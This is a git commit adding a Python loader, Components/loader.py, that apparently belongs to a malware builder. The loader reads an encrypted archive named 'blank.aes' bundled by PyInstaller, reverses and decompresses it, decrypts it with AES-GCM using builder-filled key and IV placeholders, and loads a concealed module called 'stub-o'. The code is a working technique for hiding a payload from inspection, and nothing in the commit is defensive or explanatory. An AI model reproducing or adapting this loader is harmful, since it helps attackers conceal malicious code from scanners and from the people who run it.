722f742aee8339714ce200b9835e412f218a724a
Phantom <138269174+Phxnt0m1@users.noreply.github.com>
2023-09-10 18:21:16 +0200

    Add files via upload

---
+++ Components/loader.py
@@ -0,0 +1,22 @@
+import os, sys, base64, zlib
+from pyaes import AESModeOfOperationGCM
+from zipimport import zipimporter
+
+zipfile = os.path.join(sys._MEIPASS, "blank.aes")
+module = "stub-o"
+
+key = base64.b64decode("%key%")
+iv = base64.b64decode("%iv%")
+
+def decrypt(key, iv, ciphertext):
+    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)
+
+if os.path.isfile(zipfile):
+    with open(zipfile, "rb") as f:
+        ciphertext = f.read()
+    ciphertext = zlib.decompress(ciphertext[::-1])
+    decrypted = decrypt(key, iv, ciphertext)
+    with open(zipfile, "wb") as f:
+        f.write(decrypted)
+    
+    zipimporter(zipfile).load_module(module)
